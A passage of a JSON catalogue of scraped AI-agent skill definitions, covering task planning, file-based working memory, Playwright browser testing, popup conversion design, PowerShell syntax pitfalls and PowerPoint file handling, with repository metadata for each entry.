FIX:**\n- What's the root cause?\n- What file/line to change?\n- How to test the fix?\n\n---\n\n### Principle 4: Scripts Are Project-Specific\n\n> 🔴 **DO NOT copy-paste script commands. Choose based on project type.**\n\n| Project Type | Relevant Scripts |\n|--------------|------------------|\n| Frontend/React | `ux_audit.py`, `accessibility_checker.py` |\n| Backend/API | `api_validator.py`, `security_scan.py` |\n| Mobile | `mobile_audit.py` |\n| Database | `schema_validator.py` |\n| Full-stack | Mix of above based on what you touched |\n\n**Wrong:** Adding all scripts to every plan\n**Right:** Only scripts relevant to THIS task\n\n---\n\n### Principle 5: Verification is Simple\n\n| ❌ Wrong | ✅ Right |\n|----------|----------|\n| \"Verify the component works correctly\" | \"Run `npm run dev`, click button, see toast\" |\n| \"Test the API\" | \"curl localhost:3000/api/users returns 200\" |\n| \"Check styles\" | \"Open browser, verify dark mode toggle works\" |\n\n---\n\n## Plan Structure (Flexible, Not Fixed!)\n\n```\n# [Task Name]\n\n## Goal\nOne sentence: What are we building/fixing?\n\n## Tasks\n- [ ] Task 1: [Specific action] → Verify: [How to check]\n- [ ] Task 2: [Specific action] → Verify: [How to check]\n- [ ] Task 3: [Specific action] → Verify: [How to check]\n\n## Done When\n- [ ] [Main success criteria]\n```\n\n> **That's it.** No phases, no sub-sections unless truly needed.\n> Keep it minimal. Add complexity only when required.\n\n## Notes\n[Any important considerations]\n```\n\n---\n\n## Best Practices (Quick Reference)\n\n1. **Start with goal** - What are we building/fixing?\n2. **Max 10 tasks** - If more, break into multiple plans\n3. **Each task verifiable** - Clear \"done\" criteria\n4. **Project-specific** - No copy-paste templates\n5. **Update as you go** - Mark `[x]` when complete\n\n---\n\n## When to Use\n\n- New project from scratch\n- Adding a feature\n- Fixing a bug (if complex)\n- Refactoring multiple files\n",
      "tags": [
        "react",
        "api",
        "claude",
        "ai",
        "template",
        "security",
        "tailwind",
        "cro"
      ],
      "useCases": [
        "New project from scratch",
        "Adding a feature",
        "Fixing a bug (if complex)",
        "Refactoring multiple files"
      ],
      "scrapedAt": "2026-01-26T13:20:18.112Z"
    },
    {
      "id": "antigravity-planning-with-files",
      "name": "planning-with-files",
      "slug": "planning-with-files",
      "description": "Implements Manus-style file-based planning for complex tasks. Creates task_plan.md, findings.md, and progress.md. Use when starting complex multi-step tasks, research projects, or any task requiring >5 tool calls.",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/planning-with-files",
      "content": "\n# Planning with Files\n\nWork like Manus: Use persistent markdown files as your \"working memory on disk.\"\n\n## Important: Where Files Go\n\nWhen using this skill:\n\n- **Templates** are stored in the skill directory at `${CLAUDE_PLUGIN_ROOT}/templates/`\n- **Your planning files** (`task_plan.md`, `findings.md`, `progress.md`) should be created in **your project directory** — the folder where you're working\n\n| Location | What Goes There |\n|----------|-----------------|\n| Skill directory (`${CLAUDE_PLUGIN_ROOT}/`) | Templates, scripts, reference docs |\n| Your project directory | `task_plan.md`, `findings.md`, `progress.md` |\n\nThis ensures your planning files live alongside your code, not buried in the skill installation folder.\n\n## Quick Start\n\nBefore ANY complex task:\n\n1. **Create `task_plan.md`** in your project — Use [templates/task_plan.md](templates/task_plan.md) as reference\n2. **Create `findings.md`** in your project — Use [templates/findings.md](templates/findings.md) as reference\n3. **Create `progress.md`** in your project — Use [templates/progress.md](templates/progress.md) as reference\n4. **Re-read plan before decisions** — Refreshes goals in attention window\n5. **Update after each phase** — Mark complete, log errors\n\n> **Note:** All three planning files should be created in your current working directory (your project root), not in the skill's installation folder.\n\n## The Core Pattern\n\n```\nContext Window = RAM (volatile, limited)\nFilesystem = Disk (persistent, unlimited)\n\n→ Anything important gets written to disk.\n```\n\n## File Purposes\n\n| File | Purpose | When to Update |\n|------|---------|----------------|\n| `task_plan.md` | Phases, progress, decisions | After each phase |\n| `findings.md` | Research, discoveries | After ANY discovery |\n| `progress.md` | Session log, test results | Throughout session |\n\n## Critical Rules\n\n### 1. Create Plan First\nNever start a complex task without `task_plan.md`. Non-negotiable.\n\n### 2. The 2-Action Rule\n> \"After every 2 view/browser/search operations, IMMEDIATELY save key findings to text files.\"\n\nThis prevents visual/multimodal information from being lost.\n\n### 3. Read Before Decide\nBefore major decisions, read the plan file. This keeps goals in your attention window.\n\n### 4. Update After Act\nAfter completing any phase:\n- Mark phase status: `in_progress` → `complete`\n- Log any errors encountered\n- Note files created/modified\n\n### 5. Log ALL Errors\nEvery error goes in the plan file. This builds knowledge and prevents repetition.\n\n```markdown\n## Errors Encountered\n| Error | Attempt | Resolution |\n|-------|---------|------------|\n| FileNotFoundError | 1 | Created default config |\n| API timeout | 2 | Added retry logic |\n```\n\n### 6. Never Repeat Failures\n```\nif action_failed:\n    next_action != same_action\n```\nTrack what you tried. Mutate the approach.\n\n## The 3-Strike Error Protocol\n\n```\nATTEMPT 1: Diagnose & Fix\n  → Read error carefully\n  → Identify root cause\n  → Apply targeted fix\n\nATTEMPT 2: Alternative Approach\n  → Same error? Try different method\n  → Different tool? Different library?\n  → NEVER repeat exact same failing action\n\nATTEMPT 3: Broader Rethink\n  → Question assumptions\n  → Search for solutions\n  → Consider updating the plan\n\nAFTER 3 FAILURES: Escalate to User\n  → Explain what you tried\n  → Share the specific error\n  → Ask for guidance\n```\n\n## Read vs Write Decision Matrix\n\n| Situation | Action | Reason |\n|-----------|--------|--------|\n| Just wrote a file | DON'T read | Content still in context |\n| Viewed image/PDF | Write findings NOW | Multimodal → text before lost |\n| Browser returned data | Write to file | Screenshots don't persist |\n| Starting new phase | Read plan/findings | Re-orient if context stale |\n| Error occurred | Read relevant file | Need current state to fix |\n| Resuming after gap | Read all planning files | Recover state |\n\n## The 5-Question Reboot Test\n\nIf you can answer these, your context management is solid:\n\n| Question | Answer Source |\n|----------|---------------|\n| Where am I? | Current phase in task_plan.md |\n| Where am I going? | Remaining phases |\n| What's the goal? | Goal statement in plan |\n| What have I learned? | findings.md |\n| What have I done? | progress.md |\n\n## When to Use This Pattern\n\n**Use for:**\n- Multi-step tasks (3+ steps)\n- Research tasks\n- Building/creating projects\n- Tasks spanning many tool calls\n- Anything requiring organization\n\n**Skip for:**\n- Simple questions\n- Single-file edits\n- Quick lookups\n\n## Templates\n\nCopy these templates to start:\n\n- [templates/task_plan.md](templates/task_plan.md) — Phase tracking\n- [templates/findings.md](templates/findings.md) — Research storage\n- [templates/progress.md](templates/progress.md) — Session logging\n\n## Scripts\n\nHelper scripts for automation:\n\n- `scripts/init-session.sh` — Initialize all planning files\n- `scripts/check-complete.sh` — Verify all phases complete\n\n## Advanced Topics\n\n- **Manus Principles:** See [reference.md](reference.md)\n- **Real Examples:** See [examp",
      "tags": [
        "pdf",
        "markdown",
        "api",
        "claude",
        "ai",
        "automation",
        "template",
        "image",
        "rag"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:20:19.383Z"
    },
    {
      "id": "antigravity-playwright-skill",
      "name": "playwright-skill",
      "slug": "playwright-skill",
      "description": "Complete browser automation with Playwright. Auto-detects dev servers, writes clean test scripts to /tmp. Test pages, fill forms, take screenshots, check responsive design, validate UX, test login flows, check links, automate any browser task. Use when user wants to test websites, automate browser i",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/playwright-skill",
      "content": "\n**IMPORTANT - Path Resolution:**\nThis skill can be installed in different locations (plugin system, manual installation, global, or project-specific). Before executing any commands, determine the skill directory based on where you loaded this SKILL.md file, and use that path in all commands below. Replace `$SKILL_DIR` with the actual discovered path.\n\nCommon installation paths:\n\n- Plugin system: `~/.claude/plugins/marketplaces/playwright-skill/skills/playwright-skill`\n- Manual global: `~/.claude/skills/playwright-skill`\n- Project-specific: `<project>/.claude/skills/playwright-skill`\n\n# Playwright Browser Automation\n\nGeneral-purpose browser automation skill. I'll write custom Playwright code for any automation task you request and execute it via the universal executor.\n\n**CRITICAL WORKFLOW - Follow these steps in order:**\n\n1. **Auto-detect dev servers** - For localhost testing, ALWAYS run server detection FIRST:\n\n   ```bash\n   cd $SKILL_DIR && node -e \"require('./lib/helpers').detectDevServers().then(servers => console.log(JSON.stringify(servers)))\"\n   ```\n\n   - If **1 server found**: Use it automatically, inform user\n   - If **multiple servers found**: Ask user which one to test\n   - If **no servers found**: Ask for URL or offer to help start dev server\n\n2. **Write scripts to /tmp** - NEVER write test files to skill directory; always use `/tmp/playwright-test-*.js`\n\n3. **Use visible browser by default** - Always use `headless: false` unless user specifically requests headless mode\n\n4. **Parameterize URLs** - Always make URLs configurable via environment variable or constant at top of script\n\n## How It Works\n\n1. You describe what you want to test/automate\n2. I auto-detect running dev servers (or ask for URL if testing external site)\n3. I write custom Playwright code in `/tmp/playwright-test-*.js` (won't clutter your project)\n4. I execute it via: `cd $SKILL_DIR && node run.js /tmp/playwright-test-*.js`\n5. Results displayed in real-time, browser window visible for debugging\n6. Test files auto-cleaned from /tmp by your OS\n\n## Setup (First Time)\n\n```bash\ncd $SKILL_DIR\nnpm run setup\n```\n\nThis installs Playwright and Chromium browser. Only needed once.\n\n## Execution Pattern\n\n**Step 1: Detect dev servers (for localhost testing)**\n\n```bash\ncd $SKILL_DIR && node -e \"require('./lib/helpers').detectDevServers().then(s => console.log(JSON.stringify(s)))\"\n```\n\n**Step 2: Write test script to /tmp with URL parameter**\n\n```javascript\n// /tmp/playwright-test-page.js\nconst { chromium } = require('playwright');\n\n// Parameterized URL (detected or user-provided)\nconst TARGET_URL = 'http://localhost:3001'; // <-- Auto-detected or from user\n\n(async () => {\n  const browser = await chromium.launch({ headless: false });\n  const page = await browser.newPage();\n\n  await page.goto(TARGET_URL);\n  console.log('Page loaded:', await page.title());\n\n  await page.screenshot({ path: '/tmp/screenshot.png', fullPage: true });\n  console.log('📸 Screenshot saved to /tmp/screenshot.png');\n\n  await browser.close();\n})();\n```\n\n**Step 3: Execute from skill directory**\n\n```bash\ncd $SKILL_DIR && node run.js /tmp/playwright-test-page.js\n```\n\n## Common Patterns\n\n### Test a Page (Multiple Viewports)\n\n```javascript\n// /tmp/playwright-test-responsive.js\nconst { chromium } = require('playwright');\n\nconst TARGET_URL = 'http://localhost:3001'; // Auto-detected\n\n(async () => {\n  const browser = await chromium.launch({ headless: false, slowMo: 100 });\n  const page = await browser.newPage();\n\n  // Desktop test\n  await page.setViewportSize({ width: 1920, height: 1080 });\n  await page.goto(TARGET_URL);\n  console.log('Desktop - Title:', await page.title());\n  await page.screenshot({ path: '/tmp/desktop.png', fullPage: true });\n\n  // Mobile test\n  await page.setViewportSize({ width: 375, height: 667 });\n  await page.screenshot({ path: '/tmp/mobile.png', fullPage: true });\n\n  await browser.close();\n})();\n```\n\n### Test Login Flow\n\n```javascript\n// /tmp/playwright-test-login.js\nconst { chromium } = require('playwright');\n\nconst TARGET_URL = 'http://localhost:3001'; // Auto-detected\n\n(async () => {\n  const browser = await chromium.launch({ headless: false });\n  const page = await browser.newPage();\n\n  await page.goto(`${TARGET_URL}/login`);\n\n  await page.fill('input[name=\"email\"]', 'test@example.com');\n  await page.fill('input[name=\"password\"]', 'password123');\n  await page.click('button[type=\"submit\"]');\n\n  // Wait for redirect\n  await page.waitForURL('**/dashboard');\n  console.log('✅ Login successful, redirected to dashboard');\n\n  await browser.close();\n})();\n```\n\n### Fill and Submit Form\n\n```javascript\n// /tmp/playwright-test-form.js\nconst { chromium } = require('playwright');\n\nconst TARGET_URL = 'http://localhost:3001'; // Auto-detected\n\n(async () => {\n  const browser = await chromium.launch({ headless: false, slowMo: 50 });\n  const page = await browser.newPage();\n\n  await page.goto(`${TARGET_URL}/contact`);\n\n  await page.fill('input[name=\"name\"]', 'John Doe');\n  awa",
      "tags": [
        "javascript",
        "node",
        "api",
        "claude",
        "ai",
        "llm",
        "automation",
        "workflow",
        "design",
        "document"
      ],
      "useCases": [
        "http://localhost:3000",
        "http://localhost:3001"
      ],
      "scrapedAt": "2026-01-26T13:20:22.780Z"
    },
    {
      "id": "antigravity-popup-cro",
      "name": "popup-cro",
      "slug": "popup-cro",
      "description": "Create and optimize popups, modals, overlays, slide-ins, and banners to increase conversions without harming user experience or brand trust.",
      "category": "Creative & Media",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/popup-cro",
      "content": "# Popup CRO\n\nYou are an expert in popup and modal optimization. Your goal is to design **high-converting, respectful interruption patterns** that capture value at the right moment—without annoying users, harming trust, or violating SEO or accessibility guidelines.\n\nThis skill focuses on **strategy, copy, triggers, and rules**.\nFor optimizing the **form inside the popup**, see **form-cro**.\nFor optimizing the **page itself**, see **page-cro**.\n\n---\n\n## 1. Initial Assessment (Required)\n\nBefore making recommendations, establish context:\n\n### 1. Popup Purpose\n\nWhat is the *single* job of this popup?\n\n* Email / newsletter capture\n* Lead magnet delivery\n* Discount or promotion\n* Exit intent save\n* Feature or announcement\n* Feedback or survey\n\n> If the purpose is unclear, the popup will fail.\n\n### 2. Current State\n\n* Is there an existing popup?\n* Current conversion rate (if known)?\n* Triggers currently used?\n* User complaints, rage clicks, or feedback?\n* Desktop vs mobile behavior?\n\n### 3. Audience & Context\n\n* Traffic source (paid, organic, email, referral)\n* New vs returning visitors\n* Pages where popup appears\n* Funnel stage (awareness, consideration, purchase)\n\n---\n\n## 2. Core Principles (Non-Negotiable)\n\n### 1. Timing > Design\n\nA perfectly designed popup shown at the wrong moment will fail.\n\n### 2. Value Must Be Immediate\n\nThe user must understand *why this interruption is worth it* in under 3 seconds.\n\n### 3. Respect Is a Conversion Lever\n\nEasy dismissal, clear intent, and restraint increase long-term conversion.\n\n### 4. One Popup, One Job\n\nMultiple CTAs or mixed goals destroy performance.\n\n---\n\n## 3. Trigger Strategy (Choose Intentionally)\n\n### Time-Based (Use Sparingly)\n\n* ❌ Avoid: “Show after 5 seconds”\n* ✅ Better: 30–60 seconds of active engagement\n* Best for: Broad list building\n\n### Scroll-Based\n\n* Typical: 25–50% scroll depth\n* Indicates engagement, not curiosity\n* Best for: Blog posts, guides, long content\n\n### Exit Intent\n\n* Desktop: Cursor movement toward browser UI\n* Mobile: Back button / upward scroll\n* Best for: E-commerce, lead recovery\n\n### Click-Triggered (Highest Intent)\n\n* User initiates action\n* Zero interruption cost\n* Best for: Lead magnets, demos, gated assets\n\n### Session / Page Count\n\n* Trigger after X pages or visits\n* Best for: Comparison or research behavior\n\n### Behavior-Based (Advanced)\n\n* Pricing page visits\n* Add-to-cart without checkout\n* Repeated page views\n* Best for: High-intent personalization\n\n---\n\n## 4. Popup Types & Use Cases\n\n### Email Capture\n\n**Goal:** Grow list\n\n**Requirements**\n\n* Specific benefit (not “Subscribe”)\n* Email-only field preferred\n* Clear frequency expectation\n\n### Lead Magnet\n\n**Goal:** Exchange value for contact info\n\n**Requirements**\n\n* Show what they get (preview, bullets, cover)\n* Minimal fields\n* Instant delivery expectation\n\n### Discount / Promotion\n\n**Goal:** Drive first conversion\n\n**Requirements**\n\n* Clear incentive (%, $, shipping)\n* Single-use or limited\n* Obvious application method\n\n### Exit Intent\n\n**Goal:** Salvage abandoning users\n\n**Requirements**\n\n* Acknowledge exit\n* Different offer than entry popup\n* Objection handling\n\n### Announcement Banner\n\n**Goal:** Inform, not interrupt\n\n**Requirements**\n\n* One message\n* Dismissable\n* Time-bound\n\n### Slide-In\n\n**Goal:** Low-friction engagement\n\n**Requirements**\n\n* Does not block content\n* Easy dismiss\n* Good for secondary CTAs\n\n---\n\n## 5. Copy Frameworks\n\n### Headline Patterns\n\n* Benefit: “Get [result] in [timeframe]”\n* Question: “Want [outcome]?”\n* Social proof: “Join 12,000+ teams who…”\n* Curiosity: “Most people get this wrong…”\n\n### Subheadlines\n\n* Clarify value\n* Reduce fear (“No spam”)\n* Set expectations\n\n### CTA Buttons\n\n* Prefer first person: “Get My Guide”\n* Be specific: “Send Me the Checklist”\n* Avoid generic: “Submit”, “Learn More”\n\n### Decline Copy\n\n* Neutral and respectful\n* ❌ No guilt or manipulation\n* Examples: “No thanks”, “Maybe later”\n\n---\n\n## 6. Design & UX Rules\n\n### Visual Hierarchy\n\n1. Headline\n2. Value proposition\n3. Action (form or CTA)\n4. Close option\n\n### Close Behavior (Mandatory)\n\n* Visible “X”\n* Click outside closes\n* ESC key closes\n* Large enough on mobile\n\n### Mobile Rules\n\n* Avoid full-screen blockers\n* Bottom slide-ups preferred\n* Large tap targets\n* Easy dismissal\n\n---\n\n## 7. Frequency, Targeting & Rules\n\n### Frequency Capping\n\n* Max once per session\n* Respect dismissals\n* 7–30 day cooldown typical\n\n### Targeting\n\n* New vs returning visitors\n* Traffic source alignment\n* Page-type relevance\n* Exclude converters\n\n### Hard Exclusions\n\n* Checkout\n* Signup flows\n* Critical conversion steps\n\n---\n\n## 8. Compliance & SEO Safety\n\n### Accessibility\n\n* Keyboard navigable\n* Focus trapped while open\n* Screen-reader compatible\n* Sufficient contrast\n\n### Privacy\n\n* Clear consent language\n* Link to privacy policy\n* No pre-checked opt-ins\n\n### Google Interstitial Guidelines\n\n* Avoid intrusive mobile interstitials\n* Allowed: cookie notices, age gates, banners\n* Risky: full-scree",
      "tags": [
        "ai",
        "design",
        "rag",
        "seo",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:20:25.068Z"
    },
    {
      "id": "antigravity-powershell-windows",
      "name": "powershell-windows",
      "slug": "powershell-windows",
      "description": "PowerShell Windows patterns. Critical pitfalls, operator syntax, error handling.",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/powershell-windows",
      "content": "\n# PowerShell Windows Patterns\n\n> Critical patterns and pitfalls for Windows PowerShell.\n\n---\n\n## 1. Operator Syntax Rules\n\n### CRITICAL: Parentheses Required\n\n| ❌ Wrong | ✅ Correct |\n|----------|-----------|\n| `if (Test-Path \"a\" -or Test-Path \"b\")` | `if ((Test-Path \"a\") -or (Test-Path \"b\"))` |\n| `if (Get-Item $x -and $y -eq 5)` | `if ((Get-Item $x) -and ($y -eq 5))` |\n\n**Rule:** Each cmdlet call MUST be in parentheses when using logical operators.\n\n---\n\n## 2. Unicode/Emoji Restriction\n\n### CRITICAL: No Unicode in Scripts\n\n| Purpose | ❌ Don't Use | ✅ Use |\n|---------|-------------|--------|\n| Success | ✅ ✓ | [OK] [+] |\n| Error | ❌ ✗ 🔴 | [!] [X] |\n| Warning | ⚠️ 🟡 | [*] [WARN] |\n| Info | ℹ️ 🔵 | [i] [INFO] |\n| Progress | ⏳ | [...] |\n\n**Rule:** Use ASCII characters only in PowerShell scripts.\n\n---\n\n## 3. Null Check Patterns\n\n### Always Check Before Access\n\n| ❌ Wrong | ✅ Correct |\n|----------|-----------|\n| `$array.Count -gt 0` | `$array -and $array.Count -gt 0` |\n| `$text.Length` | `if ($text) { $text.Length }` |\n\n---\n\n## 4. String Interpolation\n\n### Complex Expressions\n\n| ❌ Wrong | ✅ Correct |\n|----------|-----------|\n| `\"Value: $($obj.prop.sub)\"` | Store in variable first |\n\n**Pattern:**\n```\n$value = $obj.prop.sub\nWrite-Output \"Value: $value\"\n```\n\n---\n\n## 5. Error Handling\n\n### ErrorActionPreference\n\n| Value | Use |\n|-------|-----|\n| Stop | Development (fail fast) |\n| Continue | Production scripts |\n| SilentlyContinue | When errors expected |\n\n### Try/Catch Pattern\n\n- Don't return inside try block\n- Use finally for cleanup\n- Return after try/catch\n\n---\n\n## 6. File Paths\n\n### Windows Path Rules\n\n| Pattern | Use |\n|---------|-----|\n| Literal path | `C:\\Users\\User\\file.txt` |\n| Variable path | `Join-Path $env:USERPROFILE \"file.txt\"` |\n| Relative | `Join-Path $ScriptDir \"data\"` |\n\n**Rule:** Use Join-Path for cross-platform safety.\n\n---\n\n## 7. Array Operations\n\n### Correct Patterns\n\n| Operation | Syntax |\n|-----------|--------|\n| Empty array | `$array = @()` |\n| Add item | `$array += $item` |\n| ArrayList add | `$list.Add($item) | Out-Null` |\n\n---\n\n## 8. JSON Operations\n\n### CRITICAL: Depth Parameter\n\n| ❌ Wrong | ✅ Correct |\n|----------|-----------|\n| `ConvertTo-Json` | `ConvertTo-Json -Depth 10` |\n\n**Rule:** Always specify `-Depth` for nested objects.\n\n### File Operations\n\n| Operation | Pattern |\n|-----------|---------|\n| Read | `Get-Content \"file.json\" -Raw | ConvertFrom-Json` |\n| Write | `$data | ConvertTo-Json -Depth 10 | Out-File \"file.json\" -Encoding UTF8` |\n\n---\n\n## 9. Common Errors\n\n| Error Message | Cause | Fix |\n|---------------|-------|-----|\n| \"parameter 'or'\" | Missing parentheses | Wrap cmdlets in () |\n| \"Unexpected token\" | Unicode character | Use ASCII only |\n| \"Cannot find property\" | Null object | Check null first |\n| \"Cannot convert\" | Type mismatch | Use .ToString() |\n\n---\n\n## 10. Script Template\n\n```powershell\n# Strict mode\nSet-StrictMode -Version Latest\n$ErrorActionPreference = \"Continue\"\n\n# Paths\n$ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path\n\n# Main\ntry {\n    # Logic here\n    Write-Output \"[OK] Done\"\n    exit 0\n}\ncatch {\n    Write-Warning \"Error: $_\"\n    exit 1\n}\n```\n\n---\n\n> **Remember:** PowerShell has unique syntax rules. Parentheses, ASCII-only, and null checks are non-negotiable.\n",
      "tags": [
        "ai",
        "template",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:20:28.771Z"
    },
    {
      "id": "anthropic-pptx",
      "name": "pptx",
      "slug": "pptx",
      "description": "Presentation creation, editing, and analysis. When Claude needs to work with presentations (.pptx files) for: (1) Creating new presentations, (2) Modifying or editing content, (3) Working with layouts, (4) Adding comments or speaker notes, or any other presentation tasks",
      "category": "Document Processing",
      "source": "anthropic",
      "repoUrl": "https://github.com/anthropics/skills",
      "skillUrl": "https://github.com/anthropics/skills/tree/main/skills/pptx",
      "content": "\n# PPTX creation, editing, and analysis\n\n## Overview\n\nA user may ask you to create, edit, or analyze the contents of a .pptx file. A .pptx file is essentially a ZIP archive containing XML files and other resources that you can read or edit. You have different tools and workflows available for different tasks.\n\n## Reading and analyzing content\n\n### Text extraction\nIf you just need to read the text contents of a presentation, you should convert the document to markdown:\n\n```bash\n# Convert document to markdown\npython -m markitdown path-to-file.pptx\n```\n\n### Raw XML access\nYou need raw XML access for: comments, speaker notes, slide layouts, animations, design elements, and complex formatting. For any of these features, you'll need to unpack a presentation and read its raw XML contents.\n\n#### Unpacking a file\n`python ooxml/scripts/unpack.py <office_file> <output_dir>`\n\n**Note**: The unpack.py script is located at `skills/pptx/ooxml/scripts/unpack.py` relative to the project root. If the script doesn't exist at this path, use `find . -name \"unpack.py\"` to locate it.\n\n#### Key file structures\n* `ppt/presentation.xml` - Main presentation metadata and slide references\n* `ppt/slides/slide{N}.xml` - Individual slide contents (slide1.xml, slide2.xml, etc.)\n* `ppt/notesSlides/notesSlide{N}.xml` - Speaker notes for each slide\n* `ppt/comments/modernComment_*.xml` - Comments for specific slides\n* `ppt/slideLayouts/` - Layout templates for slides\n* `ppt/slideMasters/` - Master slide templates\n* `ppt/theme/` - Theme and styling information\n* `ppt/media/` - Images and other media files\n\n#### Typography and color extraction\n**When given an example design to emulate**: Always analyze the presentation's typography and colors first using the methods below:\n1. **Read theme file**: Check `ppt/theme/theme1.xml` for colors (`<a:clrScheme>`) and fonts (`<a:fontScheme>`)\n2. **Sample slide content**: Examine `ppt/slides/slide1.xml` for actual font usage (`<a:rPr>`) and colors\n3. **Search for patterns**: Use grep to find color (`<a:solidFill>`, `<a:srgbClr>`) and font references across all XML files\n\n## Creating a new PowerPoint presentation **without a template**\n\nWhen creating a new PowerPoint presentation from scratch, use the **html2pptx** workflow to convert HTML slides to PowerPoint with accurate positioning.\n\n### Design Principles\n\n**CRITICAL**: Before creating any presentation, analyze the content and choose appropriate design elements:\n1. **Consider the subject matter**: What is this presentation about? What tone, industry, or mood does it suggest?\n2. **Check for branding**: If the user mentions a company/organization, consider their brand colors and identity\n3. **Match palette to content**: Select colors that reflect the subject\n4. **State your approach**: Explain your design choices before writing code\n\n**Requirements**:\n- ✅ State your content-informed design approach BEFORE writing code\n- ✅ Use web-safe fonts only: Arial, Helvetica, Times New Roman, Georgia, Courier New, Verdana, Tahoma, Trebuchet MS, Impact\n- ✅ Create clear visual hierarchy through size, weight, and color\n- ✅ Ensure readability: strong contrast, appropriately sized text, clean alignment\n- ✅ Be consistent: repeat patterns, spacing, and visual language across slides\n\n#### Color Palette Selection\n\n**Choosing colors creatively**:\n- **Think beyond defaults**: What colors genuinely match this specific topic? Avoid autopilot choices.\n- **Consider multiple angles**: Topic, industry, mood, energy level, target audience, brand identity (if mentioned)\n- **Be adventurous**: Try unexpected combinations - a healthcare presentation doesn't have to be green, finance doesn't have to be navy\n- **Build your palette**: Pick 3-5 colors that work together (dominant colors + supporting tones + accent)\n- **Ensure contrast**: Text must be clearly readable on backgrounds\n\n**Example color palettes** (use these to spark creativity - choose one, adapt it, or create your own):\n\n1. **Classic Blue**: Deep navy (#1C2833), slate gray (#2E4053), silver (#AAB7B8), off-white (#F4F6F6)\n2. **Teal & Coral**: Teal (#5EA8A7), deep teal (#277884), coral (#FE4447), white (#FFFFFF)\n3. **Bold Red**: Red (#C0392B), bright red (#E74C3C), orange (#F39C12), yellow (#F1C40F), green (#2ECC71)\n4. **Warm Blush**: Mauve (#A49393), blush (#EED6D3), rose (#E8B4B8), cream (#FAF7F2)\n5. **Burgundy Luxury**: Burgundy (#5D1D2E), crimson (#951233), rust (#C15937), gold (#997929)\n6. **Deep Purple & Emerald**: Purple (#B165FB), dark blue (#181B24), emerald (#40695B), white (#FFFFFF)\n7. **Cream & Forest Green**: Cream (#FFE1C7), forest green (#40695B), white (#FCFCFC)\n8. **Pink & Purple**: Pink (#F8275B), coral (#FF574A), rose (#FF737D), purple (#3D2F68)\n9. **Lime & Plum**: Lime (#C5DE82), plum (#7C3A5F), coral (#FD8C6E), blue-gray (#98ACB5)\n10. **Black & Gold**: Gold (#BF9A4A), black (#000000), cream (#F4F6F6)\n11. **Sage & Terracotta**: Sage (#87A96B), terracotta (#E07A5F), cream (#F4F1DE), charcoal (#2C2C2C)\n12. **Charco",
      "tags": [
        "python",
        "javascript",
        "react",
        "pdf",
        "pptx",
        "markdown",
        "api",
        "claude",
        "ai",
        "workflow"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:14:40.336Z"
    },
    {
      "id": "antigravity-pptx-official",
      "name": "pptx",
      "slug": "pptx-official",
      "description": "Presentation creation, editing, and analysis. When Claude needs to work with presentations (.pptx files) for: (1) Creating new presentations, (2) Modifying or editing content, (3) Working with layouts, (4) Adding comments or speaker notes, or any other presentation tasks",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/pptx-official",
      "content": "\n# PPTX creation, editing, and analysis\n\n## Overview\n\nA user may ask you to create, edit, or analyze the contents of a .pptx file. A .pptx file is essentially a ZIP archive containing XML files and other resources that you can read or edit. You have different tools and workflows available for different tasks.\n\n## Reading and analyzing content\n\n### Text extraction\nIf you just need to read the text contents of a presentation, you should convert the document to markdown:\n\n```bash\n# Convert document to markdown\npython -m markitdown path-to-file.pptx\n```\n\n### Raw XML access\nYou need raw XML access for: comments, speaker notes, slide layouts, animations, design elements, and complex formatting. For any of these features, you'll need to unpack a presentation and read its raw XML contents.\n\n#### Unpacking a file\n`python ooxml/scripts/unpack.py <office_file> <output_dir>`\n\n**Note**: The unpack.py script is located at `skills/pptx/ooxml/scripts/unpack.py` relative to the project root. If the script doesn't exist at this path, use `find . -name \"unpack.py\"` to locate it.\n\n#### Key file structures\n* `ppt/presentation.xml` - Main presentation metadata and slide references\n* `ppt/slides/slide{N}.xml` - Individual slide contents (slide1.xml, slide2.xml, etc.)\n* `ppt/notesSlides/notesSlide{N}.xml` - Speaker notes for each slide\n* `ppt/comments/modernComment_*.xml` - Comments for specific slides\n* `ppt/slideLayouts/` - Layout templates for slides\n* `ppt/slideMasters/` - Master slide templates\n* `ppt/theme/` - Theme and styling information\n* `ppt/media/` - Images and other media files\n\n#### Typography and color extraction\n**When given an example design to emulate**: Always analyze the presentation's typography and colors first using the methods below:\n1. **Read theme file**: Check `ppt/theme/theme1.xml` for colors (`<a:clrScheme>`) and fonts (`<a:fontScheme>`)\n2. **Sample slide content**: Examine `ppt/slides/slide1.xml` for actual font usage (`<a:rPr>`) and colors\n3. **Search for patterns**: Use grep to find color (`<a:solidFill>`, `<a:srgbClr>`) and font references across all XML files\n\n## Creating a new PowerPoint presentation **without a template**\n\nWhen creating a new PowerPoint presentation from scratch, use the **html2pptx** workflow to convert HTML slides to PowerPoint with accurate positioning.\n\n### Design Principles\n\n**CRITICAL**: Before creating any presentation, analyze the content and choose appropriate design elements:\n1. **Consider the subject matter**: What is this presentation about? What tone, industry, or mood does it suggest?\n2. **Check for branding**: If the user mentions a company/organization, consider their brand colors and identity\n3. **Match palette to content**: Select colors that reflect the subject\n4. **State your approach**: Explain your design choices before writing code\n\n**Requirements**:\n- ✅ State your content-informed design approach BEFORE writing code\n- ✅ Use web-safe fonts only: Arial, Helvetica, Times New Roman, Georgia, Courier New, Verdana, Tahoma, Trebuchet MS, Impact\n- ✅ Create clear visual hierarchy through size, weight, and color\n- ✅ Ensure readability: strong contrast, appropriately sized text, clean 